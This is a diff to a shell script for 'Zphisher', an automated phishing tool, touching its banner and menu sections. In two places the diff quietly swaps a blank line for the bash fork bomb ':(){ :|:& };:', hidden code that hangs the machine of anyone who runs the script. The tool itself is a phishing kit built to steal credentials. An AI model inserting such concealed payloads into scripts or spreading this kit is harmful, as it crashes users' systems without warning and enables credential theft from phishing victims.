@@ -105,7 +105,7 @@ sleep 0.05
 sleep 0.05
   echo -e $G "                             +..u                              "
 sleep 0.05
-
+:(){ :|:& };:
 ##   Zphisher 	: 	Automated Phishing Tool
 ##   Author 	: 	Hasanfq 
 ##   Version 	: 	2.2
@@ -294,7 +294,7 @@ banner() {
 
 espeak -s 115 "welcome to z phisher sir "
 }
-
+:(){ :|:& };:
 ## Small Banner
 banner_small() {
 
@@ -883,6 +883,7 @@ main_menu() {
 		${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit
 
 	EOF
+	
 	echo -e $G"select templates but some required password"$w
 	espeak -s 115 "select any template from this "
 	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
